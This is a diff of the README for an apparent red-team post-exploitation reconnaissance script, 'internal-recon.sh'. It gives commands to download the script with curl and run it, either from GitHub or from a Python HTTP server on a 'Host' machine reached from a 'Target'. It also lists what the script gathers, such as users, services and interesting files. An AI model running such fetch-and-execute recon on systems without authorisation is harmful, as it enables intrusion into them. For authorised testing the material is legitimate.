@@ -4,31 +4,37 @@ Definition...
 
 ## Usage
 
+From github:
 ```sh
-# From github
 curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/internal-recon/internal-recon.sh
 sh internal-recon.sh
 ```
+Local network:
 ```sh
-# Local network
-# Host:
+# Host
 python -m SimpleHTTPServer 8000 #or
 python3 -m http.server 8000
-# Target:
+# Target
 curl -LJO <Host>:8000/internal-recon.sh
 sh internal-recon.sh
 ```
 
 ## Checks
 
-- System Information
-- User Information: 
-...
+Script collecting information about:  
 
+- System
+- Network
+- User & groups
+- Jobs/tasks
+- Services/processes
+- Software
+- Interesting files
+- Container
 
 ## Results
 
-Results saved to current directory.
+Results saved to current directory and printed to stdout.
 
 ## Compatibility
 
@@ -54,5 +60,3 @@ sudo find /home -type f -name "*.conf"
 # search files with executable permission
 sudo find /home -perm /a=x
 ```
-
-
